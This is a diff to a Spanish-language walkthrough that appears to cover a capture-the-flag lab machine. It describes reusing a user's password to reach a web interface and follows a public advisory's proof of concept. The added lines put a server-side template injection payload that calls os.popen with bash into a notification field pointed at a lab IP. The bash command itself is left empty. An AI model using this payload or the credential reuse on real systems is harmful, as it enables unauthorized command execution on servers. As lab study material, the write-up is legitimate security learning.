@@ -128,8 +128,10 @@ Buscamos esto en internet a ver si encontramos información sobre ello vemos que
 
 Primero deberemos de ganar acceso a la interfaz y vemos que se reutiliza la password de james y estaríamos dentro de la web
 
-Seguiremos el PoC `https://github.com/advisories/GHSA-4r7v-whpg-8rx3` lo primeor que tenemos que hacer es crear un falso `index.html` y levantar un servidor con pythpn
+Seguiremos el PoC `https://github.com/advisories/GHSA-4r7v-whpg-8rx3` lo primero que tenemos que hacer es crear un falso `index.html` y levantar un servidor con Python
 
-Añadimos la url 
-Y en edit cambiamos el timer a menos tiempo y en la zona de notifications aññadimos ``
+Añadimos la url apuntando al servidor que hemos levantado 
+En edit cambiamos el timer a menos tiempo y en la zona de notifications añadimos:
+Notification URL list `get://10.10.11.34`
+`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c').read() }}`
 
